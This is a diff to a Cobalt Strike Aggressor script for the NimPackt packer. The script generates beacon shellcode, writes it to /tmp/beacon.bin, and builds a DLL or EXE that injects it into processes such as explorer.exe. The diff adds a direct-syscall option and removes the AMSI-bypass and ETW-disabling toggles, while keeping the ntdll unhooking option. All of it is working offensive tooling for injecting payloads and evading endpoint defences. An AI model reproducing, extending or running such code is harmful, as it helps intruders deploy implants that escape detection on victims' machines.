@@ -1,5 +1,3 @@
-####
-
 sub save_raw_shellcode {
         local('$handle');
         $handle = openf(">/tmp/beacon.bin");
@@ -36,18 +34,14 @@ sub compile {
                 artifact_stageless(%options["listener"], "raw", "x64", %options["proxy"], &save_raw_shellcode);
         }
 
+        # No syscalls
+        if (%options["ns"] eq "true") {
+                push(@command, "-ns")
+        }
+
         # No API unhooking
         if (%options["nu"] eq "true") {
                 push(@command, "-nu")
-        }
-
-        # No AMSI bypass
-        if (%options["na"] eq "true") {
-                push(@command, "-na")
-        }
-        # No ETW disabling
-        if (%options["ne"] eq "true") {
-                push(@command, "-ne")
         }
 
         exec(@command);
@@ -63,8 +57,6 @@ popup attacks {
                 %defaults["injectiontype"] = "remote thread, sacrificial process";
                 %defaults["filetype"] = "dll";
                 %defaults["targetproc"] = "explorer.exe";
-                %defaults["na"] = "true";
-                %defaults["ne"] = "true";
 
                 # create our dialog
                 $dialog = dialog("Generate NimPackt executable binary", %defaults, &compile);
@@ -73,9 +65,8 @@ popup attacks {
                 drow_combobox($dialog, "injectiontype", "Injection type:", @("local thread", "remote thread, sacrificial process", "remote thread, existing process"));
                 drow_combobox($dialog, "filetype", "File type:", @("dll", "exe"));
                 drow_text($dialog, "targetproc",  "Target process (remote execution only):");
-                drow_checkbox($dialog, "nu", "API Unhooking: ", "Do \UNOT\U unhook user-mode API calls (ntdll).");
-                drow_checkbox($dialog, "na", "AMSI Bypass: ", "Do \UNOT\U bypass AMSI (generally not required for shellcode).");
-                drow_checkbox($dialog, "ne", "ETW Disable: ", "Do \UNOT\U disable Event Tracing for Windows (generally not required for shellcode).");
+                drow_checkbox($dialog, "ns", "Direct Syscalls: ", "Do \UNOT\U use direct syscalls to run shellcode (compatible with Window generations 7-10).");
+                drow_checkbox($dialog, "nu", "API Unhooking: ", "Do \UNOT\U unhook user-mode API calls (ntdll) in target thread.");
                 drow_checkbox($dialog, "arch86", "Architecture: ", "Use x86 payload.");
                 dbutton_action($dialog, "Generate");
 
